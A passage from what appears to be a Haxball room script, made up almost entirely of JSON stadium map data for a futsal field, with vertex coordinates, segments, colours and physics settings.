01,-304,901,304],"a":[420,-304],"b":[420,304]}}}],"traits":{"ballArea":{"vis":false,"bCoef":1,"cMask":["ball"]},"goalPost":{"radius":8,"invMass":0,"bCoef":1},"goalNet":{"vis":true,"bCoef":0.1,"cMask":["all"]},"kickOffBarrier":{"vis":false,"bCoef":0.1,"cGroup":["redKO","blueKO"],"cMask":["red","blue"]},"line":{"vis":true,"bCoef":0,"cMask":[""]},"arco":{"radius":2,"cMask":["n\/d"],"color":"cccccc"}},"playerPhysics":{"acceleration":0.11,"kickingAcceleration":0.083,"kickStrength":5,"bCoef":0},"ballPhysics":{"radius":6.25,"color":"FFCC00","bCoef":0.4,"invMass":1.5,"damping":0.99},"joints":[],"redSpawnPoints":[],"blueSpawnPoints":[],"canBeStored":true}'; // Insert your map for 1v1 and 2v2 here. To get minimum file size, here are the instructions : 1. Download the map 2. Go to https://cssminifier.com 3. Paste the result
var bigMap = '{"name":"FUTSAL 4x4 [\u029c\u1d00x\u1d0d\u1d0f\u1d05s.\u1d04\u1d0f\u1d0d]","width":850,"height":350,"spawnDistance":120,"bg":{"type":"hockey","height":0,"width":0,"color":"718C5A"},"canBeStored":true,"vertexes":[{"x":-700,"y":-321,"trait":"linha","color":"ECE1FF"},{"x":-700,"y":-90,"trait":"linha","color":"ECE1FF"},{"x":-700,"y":91,"trait":"linha","color":"ECE1FF"},{"x":-700,"y":321,"trait":"linha","color":"ECE1FF"},{"x":-701,"y":320,"trait":"linha","color":"111129"},{"x":701,"y":320,"trait":"linha","color":"111129"},{"x":700,"y":321,"trait":"linha","color":"ECE1FF"},{"x":700,"y":90,"trait":"linha","pos":[550,80],"color":"ECE1FF"},{"x":700,"y":-90,"trait":"linha","color":"ECE1FF"},{"x":700,"y":-321,"trait":"linha","color":"ECE1FF"},{"x":701,"y":-320,"trait":"linha","color":"111129"},{"x":-701,"y":-320,"trait":"linha","color":"111129"},{"x":-700,"y":-90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":-751,"y":-90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":-750,"y":-91,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":-750,"y":91,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":-751,"y":90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":-700,"y":90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":700,"y":90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","pos":[550,80],"color":"ECE1FF","bias":10},{"x":751,"y":90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":750,"y":91,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":750,"y":-91,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":751,"y":-90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":700,"y":-90,"bCoef":1.3,"cMask":["ball"],"trait":"rede","color":"ECE1FF","bias":10},{"x":1,"y":-320,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"color":"F1C40F","vis":false},{"x":1,"y":-90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":180,"color":"F1C40F"},{"x":1,"y":90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":180,"color":"F1C40F"},{"x":1,"y":320,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"color":"F1C40F","vis":false},{"x":-698,"y":-150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":-600,"y":-150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":-600,"y":150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":-698,"y":150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":698,"y":-90,"trait":"parede","bias":40},{"x":698,"y":-318,"trait":"parede","bias":40,"color":"969EA8"},{"x":-698,"y":-318,"trait":"parede","bias":40,"color":"ECE1FF"},{"x":-698,"y":-90,"trait":"parede","bias":40,"color":"ECE1FF"},{"x":-698,"y":91,"trait":"parede","bias":40},{"x":-698,"y":318,"trait":"parede","bias":40,"color":"111129"},{"x":698,"y":318,"trait":"parede","bias":40,"color":"111129"},{"x":698,"y":90,"trait":"parede","pos":[550,80],"bias":49},{"x":0,"y":-350,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"vis":false,"color":"969EA8"},{"x":0,"y":-318.5,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"vis":false,"color":"969EA8"},{"x":0,"y":350,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"vis":false,"color":"969EA8"},{"x":0,"y":318.5,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"vis":false,"color":"969EA8"},{"x":0,"y":-90,"trait":"linha","color":"F2F2F2"},{"x":0,"y":90,"trait":"linha","color":"F2F2F2"},{"x":460,"y":-3.125,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":460,"y":3.125,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":460,"y":-2,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":460,"y":2,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":460,"y":-4,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":-685,"y":-320,"trait":"linha","color":"ECE1FF"},{"x":-700,"y":-305,"trait":"linha","color":"ECE1FF"},{"x":685,"y":320,"trait":"linha","color":"ECE1FF"},{"x":700,"y":305,"trait":"linha","color":"ECE1FF"},{"x":-700,"y":305,"trait":"linha","color":"ECE1FF"},{"x":-685,"y":320,"trait":"linha","color":"ECE1FF"},{"x":700,"y":-305,"trait":"linha","color":"ECE1FF"},{"x":685,"y":-320,"trait":"linha","color":"ECE1FF"},{"x":-698,"y":-96.25,"bCoef":0,"cMask":["ball"],"trait":"rede2","bias":20},{"x":-756.25,"y":-96.25,"bCoef":0,"cMask":["ball"],"trait":"rede2","bias":20},{"x":-756.25,"y":96.25,"bCoef":0,"cMask":["ball"],"trait":"rede2","bias":20},{"x":-698,"y":96.25,"bCoef":0,"cMask":["ball"],"trait":"rede2","bias":20},{"x":698,"y":96.25,"bCoef":0.1,"cMask":["ball"],"trait":"rede2","bias":20},{"x":756.25,"y":96.25,"bCoef":0.1,"cMask":["ball"],"trait":"rede2","bias":20},{"x":756.25,"y":-96.25,"bCoef":0.1,"cMask":["ball"],"trait":"rede2","bias":20},{"x":698,"y":-96.25,"bCoef":0.1,"cMask":["ball"],"trait":"rede2","bias":20},{"x":-601.5,"y":-150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":-601.5,"y":150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":601.5,"y":-150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":601.5,"y":150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":400,"y":-318.5,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":400,"y":318.5,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":600,"y":150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":698,"y":150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":600,"y":-150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":698,"y":-150,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":-400,"y":-318.5,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":-400,"y":318.5,"trait":"linha","curve":0,"color":"ECE1FF"},{"x":-700,"y":-90,"trait":"linha","curve":0,"color":"AAB7B8"},{"x":-700,"y":90,"trait":"linha","curve":0,"color":"AAB7B8"},{"x":700,"y":-90,"trait":"linha","curve":0,"color":"AAB7B8"},{"x":700,"y":90,"trait":"linha","curve":0,"color":"AAB7B8"},{"x":-400,"y":-90,"trait":"linha","curve":90,"color":"ECE1FF"},{"x":-400,"y":90,"trait":"linha","curve":90,"color":"ECE1FF"},{"x":400,"y":-90,"trait":"linha","curve":-90,"color":"ECE1FF"},{"x":400,"y":90,"trait":"linha","curve":-90,"color":"ECE1FF"},{"x":-460,"y":-3.125,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":-460,"y":3.125,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":-460,"y":-2,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":-460,"y":2,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":-460,"y":-4,"trait":"linha","curve":180,"color":"ECE1FF"},{"x":-1,"y":90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":180,"color":"D4AC0D"},{"x":-1,"y":320,"cMask":["wall"],"cGroup":["wall"],"color":"D4AC0D","vis":false},{"x":-1,"y":-320,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"color":"D4AC0D","vis":false},{"x":-1,"y":-90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":180,"color":"D4AC0D"},{"x":1,"y":-90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":177,"color":"F1C40F"},{"x":1,"y":90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":177,"color":"F1C40F"},{"x":1,"y":-90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":177,"color":"F1C40F"},{"x":1,"y":90,"cMask":["red","blue"],"cGroup":["redKO"],"curve":177,"color":"F1C40F"},{"x":-701,"y":320,"trait":"linha","color":"ECE1FF","curve":0},{"x":701,"y":320,"trait":"linha","color":"ECE1FF","curve":0},{"x":701,"y":-320,"trait":"linha","color":"ECE1FF","curve":0},{"x":-701,"y":-320,"trait":"linha","color":"ECE1FF","curve":0},{"x":-750,"y":-91.5,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":-71,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":-51,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":-31,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":71,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":91.5,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":29,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":49,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":-11,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":-750,"y":9,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000","bias":0},{"x":750,"y":-91.5,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":-71,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":-51,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":-31,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":71,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":91.5,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":29,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":49,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":-11,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":750,"y":9,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3","bias":0},{"x":-735,"y":90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000"},{"x":-750.8333333333333,"y":90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000"},{"x":-735,"y":-90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000"},{"x":-750.8333333333333,"y":-90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"D60000"},{"x":749.3333333333333,"y":90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3"},{"x":735,"y":90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3"},{"x":749.3333333333333,"y":-90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3"},{"x":735,"y":-90,"bCoef":1.3,"cMask":["wall"],"trait":"rede","color":"247BE3"},{"x":-700,"y":-318.5,"trait":"linha","curve":-90,"color":"717171"},{"x":-700,"y":318.5,"trait":"linha","curve":-90,"color":"717171"},{"x":700,"y":-318.5,"trait":"linha","curve":90,"color":"717171"},{"x":700,"y":318.5,"trait":"linha","curve":90,"color":"717171"},{"x":2,"y":-8.556441102823165,"cMask":["wall"],"cGroup":["wall"],"curve":183,"color":"B7950B"},{"x":2,"y":-8.556441102823165,"cMask":["wall"],"cGroup":["wall"],"curve":-183,"color":"9A7D0A"},{"x":17.295238095238094,"y":36.16743655553608,"cMask":["wall"],"cGroup":["wall"],"color":"FBE37D"},{"x":21.551373210999365,"y":48.12766794079051,"cMask":["wall"],"cGroup":["wall"],"color":"FBE37D"},{"x":0.5660714285714286,"y":61.357142857142854,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F4D03F"},{"x":15.383333333333333,"y":51,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F4D03F"},{"x":-15.102478214627542,"y":51,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F1C40F"},{"x":2,"y":61.357142857142854,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F1C40F"},{"x":-21.74086163608197,"y":48.27370507261451,"cMask":["wall"],"cGroup":["wall"],"curve":-63,"color":"F1C40F"},{"x":21.54954361725646,"y":47.909936501464415,"cMask":["wall"],"cGroup":["wall"],"curve":-63,"color":"F1C40F"},{"x":17.295238095238094,"y":36.16380975024047,"cMask":["wall"],"cGroup":["wall"],"color":"F7DC6F","curve":0},{"x":27.810714285714283,"y":60.40119047619047,"cMask":["wall"],"cGroup":["wall"],"color":"F7DC6F","curve":0},{"x":-12.854335266350585,"y":-12.785992361468388,"cMask":["wall"],"cGroup":["wall"],"curve":-5,"color":"F1C40F"},{"x":20.646695734237582,"y":18.72353377237919,"cMask":["wall"],"cGroup":["wall"],"curve":-5,"color":"F1C40F"},{"x":-20.7,"y":-1,"cMask":["wall"],"cGroup":["wall"],"curve":9,"color":"D4AC0D"},{"x":4.295238095238094,"y":22.66018294494485,"cMask":["wall"],"cGroup":["wall"],"curve":9,"color":"FBE37D"},{"x":-16.830123078763606,"y":27.74832340614142,"cMask":["wall"],"cGroup":["wall"],"curve":-7,"color":"D4AC0D"},{"x":-6.164304831809051,"y":12.851915399576606,"cMask":["wall"],"cGroup":["wall"],"curve":-7,"color":"D4AC0D"},{"x":2.372740790737518,"y":1.4573444487073814,"cMask":["wall"],"cGroup":["wall"],"curve":10,"color":"F1C40F"},{"x":10.485495563396794,"y":-9.06267393956184,"cMask":["wall"],"cGroup":["wall"],"curve":10,"color":"F1C40F"},{"x":-25.722619047619045,"y":60.40119047619047,"cMask":["wall"],"cGroup":["wall"],"curve":-30,"color":"D4AC0D"},{"x":0.5660714285714286,"y":69.17913445283055,"cMask":["wall"],"cGroup":["wall"],"curve":-30,"color":"D4AC0D"},{"x":-15.397863070978943,"y":45.452173924909616,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"F1C40F"},{"x":15.383333333333333,"y":45.47190021098944,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"FBE37D"},{"x":-15.408806827001182,"y":44.1498084355034,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"F1C40F"},{"x":15.383333333333333,"y":44.16953472158321,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"FBE37D"},{"x":-15.419750583023422,"y":42.847442946097196,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"F1C40F"},{"x":15.383333333333333,"y":42.86716923217701,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"FBE37D"},{"x":2,"y":-8.774172542149264,"cMask":["wall"],"cGroup":["wall"],"curve":186,"color":"B7950B"},{"x":2,"y":-8.774172542149264,"cMask":["wall"],"cGroup":["wall"],"curve":-186,"color":"9A7D0A"},{"x":0.2642600740769898,"y":11.850186460422716,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F4D03F"},{"x":12.569655515726534,"y":23.407815279689217,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F4D03F"},{"x":-15.261486141718102,"y":-6.9025175039976805,"cMask":["wall"],"cGroup":["wall"],"curve":20,"color":"D4AC0D"},{"x":-8.295361950462208,"y":0.22459110903362767,"cMask":["wall"],"cGroup":["wall"],"curve":20,"color":"D4AC0D"},{"x":-13.906089320814594,"y":-60.899200244591924,"cMask":["wall"],"cGroup":["wall"],"color":"F4D03F"},{"x":-0.9390786571882304,"y":-45.174752338000204,"cMask":["wall"],"cGroup":["wall"],"color":"F4D03F"},{"x":16.09441099435831,"y":-60.71580033398497,"cMask":["wall"],"cGroup":["wall"],"color":"F4D03F"},{"x":13.64746395714984,"y":-43.71098723477586,"cMask":["wall"],"cGroup":["wall"],"color":"F4D03F"},{"x":19.975892420101196,"y":-36.21768810523994,"cMask":["wall"],"cGroup":["wall"],"color":"F7DC6F"},{"x":-5.205509720938451,"y":-33.803447422514985,"cMask":["wall"],"cGroup":["wall"],"color":"F4D03F"},{"x":1.2021182442966682,"y":-23.54296828697071,"cMask":["wall"],"cGroup":["wall"],"color":"F4D03F"},{"x":-4.928111606234725,"y":-19.820494317872292,"cMask":["wall"],"cGroup":["wall"],"color":"F4D03F"},{"x":-5.493193725093485,"y":-10.017139340254602,"cMask":["wall"],"cGroup":["wall"],"color":"F1C40F"},{"x":15.219214152997544,"y":-25.355698049863857,"cMask":["wall"],"cGroup":["wall"],"color":"F7DC6F"},{"x":22.011512086907548,"y":-15.764513541219038,"cMask":["wall"],"cGroup":["wall"],"color":"F1C40F"},{"x":-27.191417131645604,"y":-40.97260383420401,"cMask":["wall"],"cGroup":["wall"],"curve":40,"color":"F4D03F"},{"x":-12.6148625342372,"y":-44.21612804371298,"cMask":["wall"],"cGroup":["wall"],"curve":40,"color":"F4D03F"},{"x":-17.767192914900857,"y":-24.800406793140944,"cMask":["wall"],"cGroup":["wall"],"color":"D4AC0D","curve":40},{"x":-25.056487561941317,"y":-26.61925393006127,"cMask":["wall"],"cGroup":["wall"],"color":"D4AC0D"},{"x":-15.3869193149567,"y":46.75453941431583,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"F1C40F"},{"x":15.383333333333333,"y":46.77426570039565,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"FBE37D"},{"x":-15.375975558934456,"y":48.056904903722035,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"F1C40F"},{"x":15.383333333333333,"y":48.07663118980186,"cMask":["wall"],"cGroup":["wall"],"curve":-35,"color":"FBE37D"},{"x":-16.007125457791304,"y":48.791666295546165,"cMask":["wall"],"cGroup":["wall"],"curve":-36,"color":"F1C40F"},{"x":15.383333333333333,"y":48.5219780284246,"cMask":["wall"],"cGroup":["wall"],"curve":-36,"color":"FBE37D"},{"x":-27.4,"y":-33.136689888661664,"cMask":["wall"],"cGroup":["wall"],"curve":10,"color":"C8A510"},{"x":-15,"y":52,"cMask":["wall"],"cGroup":["wall"],"curve":10,"color":"D4AC0D"},{"x":1.0440476190476193,"y":-64.29568957030348,"cMask":["wall"],"cGroup":["wall"],"curve":-185,"color":"D4AC0D"},{"x":2,"y":-8.556441102823165,"cMask":["wall"],"cGroup":["wall"],"curve":-185,"color":"D4AC0D"},{"x":1.0440476190476193,"y":-65.7845238095238,"cMask":["wall"],"cGroup":["wall"],"curve":-187,"color":"D4AC0D"},{"x":2,"y":-10,"cMask":["wall"],"cGroup":["wall"],"curve":-187,"color":"D4AC0D"},{"x":-16.325330104189707,"y":36.45395417388959,"cMask":["wall"],"cGroup":["wall"],"color":"D4AC0D"},{"x":-21.8033987623963,"y":51.104939144912876,"cMask":["wall"],"cGroup":["wall"],"color":"D4AC0D"},{"x":24.491789091335683,"y":-18.29674412536515,"cMask":["wall"],"cGroup":["wall"],"color":"F7DC6F","curve":-6},{"x":14.428613802880756,"y":12.533708897020562,"cMask":["wall"],"cGroup":["wall"],"color":"F7DC6F","curve":-6},{"x":-1.6535977641211121,"y":26.62280891272379,"cMask":["wall"],"cGroup":["wall"],"curve":25,"color":"F1C40F"},{"x":9.841760996090423,"y":36.96311178650215,"cMask":["wall"],"cGroup":["wall"],"curve":25,"color":"F1C40F"},{"x":-12.175163916413917,"y":31.046867620871236,"cMask":["wall"],"cGroup":["wall"],"curve":-7},{"x":-9.905765263704826,"y":41.23125159715103,"cMask":["wall"],"cGroup":["wall"],"curve":-7},{"x":0.5660714285714286,"y":69.17913445283055,"cMask":["wall"],"cGroup":["wall"],"curve":-30,"color":"F4D03F"},{"x":27.810714285714283,"y":59.44523809523809,"cMask":["wall"],"cGroup":["wall"],"curve":-30,"color":"F4D03F"},{"x":21,"y":48,"cMask":["wall"],"cGroup":["wall"],"color":"F1C40F","curve":65},{"x":-21,"y":48,"cMask":["wall"],"cGroup":["wall"],"color":"F1C40F","curve":65},{"x":-16.738643391619767,"y":38.63489537244617,"cMask":["wall"],"cGroup":["wall"],"color":"D4AC0D"},{"x":-25.722619047619045,"y":61.357142857142854,"cMask":["wall"],"cGroup":["wall"],"color":"D4AC0D"},{"x":-6.2,"y":12,"cMask":["wall"],"cGroup":["wall"],"curve":-2,"color":"F1C40F"},{"x":16.795238095238094,"y":34.16018294494485,"cMask":["wall"],"cGroup":["wall"],"curve":-2,"color":"F1C40F"},{"x":31.2,"y":-33.6,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F4D03F"},{"x":15,"y":52,"cMask":["wall"],"cGroup":["wall"],"curve":-10,"color":"F4D03F"},{"x":1.0440476190476193,"y":-64.29568957030348,"cMask":["wall"],"cGroup":["wall"],"curve":187,"color":"F1C40F"},{"x":2,"y":-8.556441102823165,"cMask":["wall"],"cGroup":["wall"],"curve":187,"color":"F1C40F"},{"x":1.0440476190476193,"y":-65.7845238095238,"cMask":["wall"],"cGroup":["wall"],"curve":185,"color":"F1C40F"},{"x":2,"y":-10,"cMask":["wall"],"cGroup":["wall"],"curve":185,"color":"F1C40F"},{"x":-34.411129288610425,"y":339.66523966511943,"cMask":["wall"]},{"x":-18.730521195897836,"y":349.07897229416335,"cMask":["wall"]},{"x":-34.411129288610425,"y":339.66523966511943,"cMask":["wall"]},{"x":-22.172605899176233,"y":330.2515070360754,"cMask":["wall"]},{"x":-29.05677530573297,"y":343.3488741721366,"cMask":["wall"]},{"x":-22.172605899176233,"y":330.2515070360754,"cMask":["wall"]},{"x":-8.977947869942483,"y":329.84221431307355,"cMask":["wall"]},{"x":-15.862117276499191,"y":340.4838251111232,"cMask":["wall"]},{"x":-8.977947869942483,"y":342.12099600313087,"cMask":["wall"]},{"x":-8.977947869942483,"y":335.1630197120984,"cMask":["wall"]},{"x":-2.476232319305552,"y":324.93070163705056,"cMask":["wall"]},{"x":-2.8586861752253867,"y":338.8466542191156,"cMask":["wall"]},{"x":-5.15340931074428,"y":329.84221431307355,"cMask":["wall"]},{"x":5.555298655010631,"y":330.2515070360754,"cMask":["wall"]},{"x":-2.8586861752253867,"y":337.4141296886089,"cMask":["wall"]},{"x":0.009717744173258325,"y":342.12099600313087,"cMask":["wall"]},{"x":17.41136818852499,"y":342.12099600313087,"cMask":["wall"]},{"x":23.339402955282225,"y":330.66079975907735,"cMask":["wall"]},{"x":16.45523354872546,"y":341.302410557127,"cMask":["wall"]},{"x":23.339402955282225,"y":342.9395814491347,"cMask":["wall"]},{"x":23.339402955282225,"y":335.9816051581022,"cMask":["wall"]},{"x":27.92884922632001,"y":329.4329215900716,"cMask":["wall"]},{"x":27.737622298360137,"y":343.7581668951385,"cMask":["wall"]},{"x":33.66565706511733,"y":329.84221431307355,"cMask":["wall"]},{"x":27.92884922632001,"y":336.39089788110414,"cMask":["wall"]}],"segments":[{"v0":0,"v1":1,"color":"ECE1FF","trait":"linha","x":-700},{"v0":2,"v1":3,"color":"ECE1FF","trait":"linha","x":-700},{"v0":6,"v1":7,"color":"ECE1FF","trait":"linha","x":700},{"v0":8,"v1":9,"color":"ECE1FF","trait":"linha","x":700},{"v0":12,"v1":13,"color":"ECE1FF","bCoef":1.3,"cMask":["ball"],"trait":"rede","bias":10,"y":-90},{"v0":14,"v1":15,"color":"ECE1FF","bCoef":1.3,"cMask":["ball"],"trait":"rede","bias":10,"x":-750},{"v0":16,"v1":17,"color":"ECE1FF","bCoef":1.3,"cMask":["ball"],"trait":"rede","bias":10,"y":80},{"v0":18,"v1":19,"color":"ECE1FF","bCoef":1.3,"cMask":["ball"],"trait":"rede","bias":10,"y":80},{"v0":20,"v1":21,"color":"ECE1FF","bCoef":1.3,"cMask":["ball"],"trait":"rede","bias":10,"x":750},{"v0":22,"v1":23,"color":"ECE1FF","bCoef":1.3,"cMask":["ball"],"trait":"rede","bias":10,"y":-90},{"v0":24,"v1":25,"color":"F1C40F","cMask":["red","blue"],"cGroup":["redKO","blueKO"],"x":1},{"v0":25,"v1":26,"curve":180,"color":"F1C40F","cMask":["red","blue"],"cGroup":["redKO"],"x":0},{"v0":26,"v1":25,"curve":180,"color":"D4AC0D","cMask":["red","blue"],"cGroup":["blueKO"],"x":0},{"v0":26,"v1":27,"color":"F1C40F","cMask":["red","blue"],"cGroup":["redKO","blueKO"],"x":1},{"v0":28,"v1":29,"curve":0,"color":"ECE1FF","trait":"linha","y":-150},{"v0":30,"v1":31,"curve":0,"color":"ECE1FF","trait":"linha","y":150},{"v0":32,"v1":33,"color":"969EA8","trait":"parede","bias":40,"x":698},{"v0":33,"v1":34,"color":"969EA8","trait":"parede","bias":40,"y":-318},{"v0":34,"v1":35,"color":"ECE1FF","trait":"parede","bias":40,"x":-698},{"v0":36,"v1":37,"color":"969EA8","trait":"parede","bias":40,"x":-698},{"v0":37,"v1":38,"color":"111129","trait":"parede","bias":40,"y":318},{"v0":38,"v1":39,"color":"969EA8","trait":"parede","bias":49,"x":698},{"v0":40,"v1":41,"vis":false,"color":"969EA8","cMask":["red","blue"],"cGroup":["redKO","blueKO"],"x":0},{"v0":42,"v1":43,"vis":false,"color":"969EA8","cMask":["red","blue"],"cGroup":["redKO","blueKO"],"x":0},{"v0":46,"v1":47,"curve":180,"color":"ECE1FF","trait":"linha","x":460},{"v0":47,"v1":46,"curve":180,"color":"ECE1FF","trait":"linha","x":460},{"v0":48,"v1":49,"curve":180,"color":"ECE1FF","trait":"linha","x":460},{"v0":49,"v1":48,"curve":180,"color":"ECE1FF","trait":"linha","x":460},{"v0":51,"v1":52,"curve":90,"color":"ECE1FF","trait":"linha"},{"v0":53,"v1":54,"curve":90,"color":"ECE1FF","trait":"linha"},{"v0":55,"v1":56,"curve":90,"color":"ECE1FF","trait":"linha"},{"v0":57,"v1":58,"curve":90,"color":"ECE1FF","trait":"linha"},{"v0":59,"v1":60,"bCoef":0,"trait":"rede2","bias":20,"y":-86.25},{"v0":60,"v1":61,"bCoef":0,"trait":"rede2","bias":40,"x":-606.25},{"v0":61,"v1":62,"bCoef":0,"trait":"rede2","bias":20,"y":86.25},{"v0":63,"v1":64,"trait":"rede2","bias":20,"y":86.25},{"v0":64,"v1":65,"trait":"rede2","bias":40,"x":606.25},{"v0":65,"v1":66,"trait":"rede2","bias":20,"y":-86.25},{"v0":67,"v1":68,"curve":0,"color":"ECE1FF","trait":"linha","y":150,"x":-601.5},{"v0":69,"v1":70,"curve":0,"color":"ECE1FF","trait":"linha","y":150,"x":601.5},{"v0":71,"v1":72,"curve":0,"color":"ECE1FF","trait":"linha","y":150,"x":400},{"v0":73,"v1":74,"curve":0,"color":"ECE1FF","trait":"linha","y":150,"x":571.5},{"v0":75,"v1":76,"curve":0,"color":"ECE1FF","trait":"linha","y":150,"x":571.5},{"v0":77,"v1":78,"curve":0,"color":"ECE1FF","trait":"linha","y":150,"x":-400},{"v0":79,"v1":80,"curve":0,"color":"AAB7B8","trait":"linha","y":150},{"v0":81,"v1":82,"curve":0,"color":"AAB7B8","trait":"linha","y":150,"x":700},{"v0":83,"v1":84,"curve":90,"color":"ECE1FF","trait":"linha","y":150,"x":-400},{"v0":85,"v1":86,"curve":-90,"color":"ECE1FF","trait":"linha","y":150,"x":400},{"v0":87,"v1":88,"curve":180,"color":"ECE1FF","trait":"linha","x":-460},{"v0":88,"v1":87,"curve":180,"color":"ECE1FF","trait":"linha","x":-460},{"v0":89,"v1":90,"curve":180,"color":"ECE1FF","trait":"linha","x":-460},{"v0":90,"v1":89,"curve":180,"color":"ECE1FF","trait":"linha","x":-460},{"v0":92,"v1":93,"color":"D4AC0D","cMask":["red","blue"],"cGroup":["redKO","blueKO"],"x":-1},{"v0":94,"v1":95,"color":"D4AC0D","cMask":["red","blue"],"cGroup":["redKO","blueKO"],"x":-1},{"v0":97,"v1":96,"curve":177,"color":"D4AC0D","cMask":["red","blue"],"cGroup":["blueKO"],"x":0},{"v0":98,"v1":99,"curve":177,"color":"F1C40F","cMask":["red","blue"],"cGroup":["redKO"],"x":0},{"v0":100,"v1":101,"curve":0,"color":"ECE1FF","trait":"linha","y":320},{"v0":102,"v1":103,"curve":0,"color":"ECE1FF","trait":"linha","y":-320},{"v0":104,"v1":105,"vis":true,"color":"D60000","bCoef":1.3,"cMask":["wall"],"trait":